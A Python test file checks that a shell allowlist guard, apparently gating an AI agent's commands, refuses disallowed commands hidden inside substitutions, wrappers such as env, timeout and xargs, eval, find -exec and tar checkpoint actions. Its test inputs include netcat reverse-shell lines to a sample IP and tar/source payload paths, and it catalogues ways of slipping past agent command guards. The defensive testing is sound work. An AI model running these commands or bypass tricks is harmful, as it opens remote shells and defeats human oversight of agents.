"""What the allowlist sees when a command line names more than one command.

`extract_commands` recorded the first token of each pipeline stage and stopped.
Everything here is a line whose head is an allowlisted word and whose payload
is not — the shape the allowlist exists to refuse and was answering "allowed"
to.

The rule these tests hold to: **a command line is judged by every command it
runs, not by the one it starts with.**

The legitimate half matters as much as the attacks. A guard that refuses
`cd $(git rev-parse --show-toplevel)` teaches an agent to route around the hook
rather than through it, and the routes around it are the ones nobody reviewed.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "apps" / "backend"))

from project_analyzer import BASE_COMMANDS, SecurityProfile  # noqa: E402
from security.command_guard import (  # noqa: E402
    MAX_SUBSTITUTION_DEPTH,
    validate_command_line,
)
from security.exec_validators import (  # noqa: E402
    validate_find_command,
    validate_source_command,
    validate_tar_command,
)
from security.parser import extract_commands, extract_substitutions  # noqa: E402


@pytest.fixture
def profile(tmp_path, monkeypatch) -> SecurityProfile:
    """A profile carrying the base allowlist and nothing project-specific.

    `nc` is the stand-in for "a command this project never allows" throughout:
    it is not in `BASE_COMMANDS`, and no stack detector adds it.
    """
    from security.constants import PROJECT_DIR_ENV_VAR

    monkeypatch.setenv(PROJECT_DIR_ENV_VAR, str(tmp_path))

    built = SecurityProfile()
    built.base_commands = set(BASE_COMMANDS)

    # The validators that re-enter the guard resolve the profile themselves,
    # from the directory the env var names. Pointing the cache at the same
    # empty directory keeps the two answers identical.
    import security.profile as profile_module

    profile_module.reset_profile_cache()
    monkeypatch.setattr(profile_module, "resolve_active_profile", lambda: built)
    monkeypatch.setattr(
        "security.exec_validators.resolve_active_profile", lambda: built
    )
    return built


def refused(command: str, profile: SecurityProfile) -> str:
    allowed, reason = validate_command_line(command, profile)
    assert not allowed, f"{command!r} was allowed, with no reason to be"
    return reason


def permitted(command: str, profile: SecurityProfile) -> None:
    allowed, reason = validate_command_line(command, profile)
    assert allowed, f"{command!r} was refused: {reason}"


class TestCommandSubstitutionIsJudged:
    """`echo $(…)` used to reach the allowlist as `echo`."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo $(nc -e /bin/sh 1.2.3.4 4444)",
            "echo `nc -e /bin/sh 1.2.3.4 4444`",
            'echo "$(nc -l 4444)"',
            "cd $(nc -l 4444)",
        ],
    )
    def test_a_denied_command_inside_a_substitution_is_denied(self, command, profile):
        assert "nc" in refused(command, profile)

    def test_nesting_is_followed_to_the_bottom(self, profile):
        assert "nc" in refused("cd $(echo $(nc -l 1))", profile)

    def test_nesting_past_the_bound_is_refused_rather_than_passed(self, profile):
        nested = "nc -l 1"
        for _ in range(MAX_SUBSTITUTION_DEPTH + 2):
            nested = f"echo $({nested})"
        allowed, _ = validate_command_line(nested, profile)
        assert not allowed

    def test_an_allowed_command_inside_a_substitution_still_runs(self, profile):
        """The reason this validates instead of refusing outright."""
        permitted("cd $(git rev-parse --show-toplevel) && ls", profile)
        permitted('echo "built $(git rev-parse HEAD)"', profile)

    def test_arithmetic_expansion_runs_nothing_and_is_not_treated_as_a_command(
        self, profile
    ):
        permitted("echo $((1 + 2))", profile)
        assert extract_substitutions("echo $((1 + 2))") == []

    def test_process_substitution_is_read_too(self):
        assert extract_substitutions("diff <(ls a) <(ls b)") == ["ls a", "ls b"]


class TestTransparentWrappers:
    """One allowlisted word standing in front of every binary on the machine."""

    @pytest.mark.parametrize(
        "command",
        [
            "env FOO=1 nc -l 4444",
            "env -u PATH nc -l 4444",
            "timeout 5 nc -l 4444",
            "timeout -s HUP 5 nc -l 4444",
            "watch -n 5 nc -l 4444",
            "command nc -l 4444",
            "xargs nc -l 4444",
            "xargs -I {} nc -l {}",
            "exec nc -l 4444",
        ],
    )
    def test_the_wrapped_command_reaches_the_allowlist(self, command, profile):
        assert "nc" in refused(command, profile)

    @pytest.mark.parametrize(
        ("command", "wrapper"),
        [
            ("sudo ls", "sudo"),
            ("nice -n 10 nc -l 4444", "nice"),
            ("stdbuf -oL nc -l 4444", "stdbuf"),
        ],
    )
    def test_the_wrapper_itself_is_still_judged(self, command, wrapper, profile):
        """Seeing past a wrapper must not excuse the wrapper.

        None of these three is in `BASE_COMMANDS`, so the line is refused on
        the wrapper and never reaches the question of what it wraps. That
        order is the safe one: an unknown wrapper is a command the project
        did not allow, whatever follows it.
        """
        assert wrapper in refused(command, profile)

    def test_an_ordinary_line_is_unchanged(self):
        assert extract_commands("echo hello") == ["echo"]
        assert extract_commands("git status") == ["git"]
        assert extract_commands("cat a | head -20") == ["cat", "head"]

    def test_a_wrapper_around_an_allowed_command_is_allowed(self, profile):
        permitted("timeout 30 git status", profile)
        permitted("env NODE_ENV=test echo ok", profile)

    def test_a_redirect_target_is_not_read_as_a_command(self, profile):
        """`exec > log` names a file, not a program."""
        permitted("exec > /tmp/build.log", profile)


class TestCommandsWhoseArgumentIsACommand:
    def test_eval_is_judged_by_what_it_would_run(self, profile):
        assert "nc" in refused('eval "nc -e /bin/sh host 1"', profile)

    def test_eval_of_an_allowed_command_passes(self, profile):
        permitted('eval "git status"', profile)

    @pytest.mark.parametrize("command", ["source /tmp/evil.sh", ". /tmp/evil.sh"])
    def test_sourcing_a_file_is_refused_because_the_file_is_not_in_the_line(
        self, command, profile
    ):
        assert "bypass" in refused(command, profile)

    def test_find_exec_is_judged(self, profile):
        assert "nc" in refused("find . -name x -exec nc -l 1 \\;", profile)
        assert "nc" in refused("find . -execdir nc -l 1 \\;", profile)

    def test_find_exec_of_an_allowed_command_still_works(self, profile):
        """The `\\;` form is the common one, and refusing it would be the tax."""
        permitted('find . -name "*.py" -exec grep -l foo {} \\;', profile)
        permitted('find . -name "*.py" -exec grep -l foo {} +', profile)
        permitted('find . -name "*.log" -delete', profile)

    def test_tar_checkpoint_action_is_refused(self, profile):
        reason = refused(
            "tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/tmp/evil .",
            profile,
        )
        assert "--checkpoint-action" in reason

    def test_an_ordinary_tar_is_untouched(self, profile):
        permitted("tar -czf out.tar.gz src/", profile)


class TestValidatorsAnswerOnlyForTheirOwnCommand:
    """Each validator is handed whatever segment matched, so it has to check."""

    def test_find_validator_ignores_a_line_that_is_not_find(self):
        assert validate_find_command("git status") == (True, "")

    def test_source_validator_ignores_a_line_that_is_not_source(self):
        assert validate_source_command("git status") == (True, "")

    def test_tar_validator_ignores_a_line_that_is_not_tar(self):
        assert validate_tar_command("git status") == (True, "")


class TestUnparseableInputFailsClosed:
    def test_a_line_naming_no_command_is_refused(self, profile):
        allowed, _ = validate_command_line("", profile)
        assert not allowed
